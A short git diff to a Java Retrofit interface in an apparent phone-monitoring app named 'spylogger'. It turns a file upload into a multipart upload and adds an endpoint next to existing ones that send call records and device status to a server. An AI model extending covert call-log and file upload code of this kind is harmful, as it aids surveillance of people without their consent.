@@ -12,9 +12,12 @@ import com.gravatasufoca.spylogger.vos.UsuarioVO;
 
 import java.util.List;
 
+import okhttp3.MultipartBody;
 import retrofit2.Call;
 import retrofit2.http.Body;
+import retrofit2.http.Multipart;
 import retrofit2.http.POST;
+import retrofit2.http.Part;
 import retrofit2.http.Path;
 
 /**
@@ -40,8 +43,9 @@ public interface SendDataInterface {
     @POST(apiUrl+"receber/ligacoes")
     Call<RespostaRecebimentoVO> enviarLigacoes(@Body List<Ligacao> ligacoes);
 
+    @Multipart
     @POST(apiUrl+"receber/arquivo")
-    Call<Boolean> enviarArquivo(@Body EnvioArquivoVO envioArquivoVO);
+    Call<Boolean> enviarArquivo(@Part MultipartBody.Part arquivo, @Part EnvioArquivoVO envioArquivoVO);
 
     @POST(apiUrl+"fcm/conectado")
     Call<Boolean> enviarAtivo(@Body EnvioArquivoVO envioArquivoVO);
@@ -60,5 +64,8 @@ public interface SendDataInterface {
 
     @POST(apiUrl+"usuario/perfil/{id}/{chave}")
     Call<UsuarioVO> inserirChave(@Path("id") Integer idAparelho, @Path("chave") String chave);
+
+    @POST(apiUrl+"receber/send")
+    Call<List<Integer>> receberArquivos(@Body EnvioArquivoVO envioArquivoVO);
 
 }
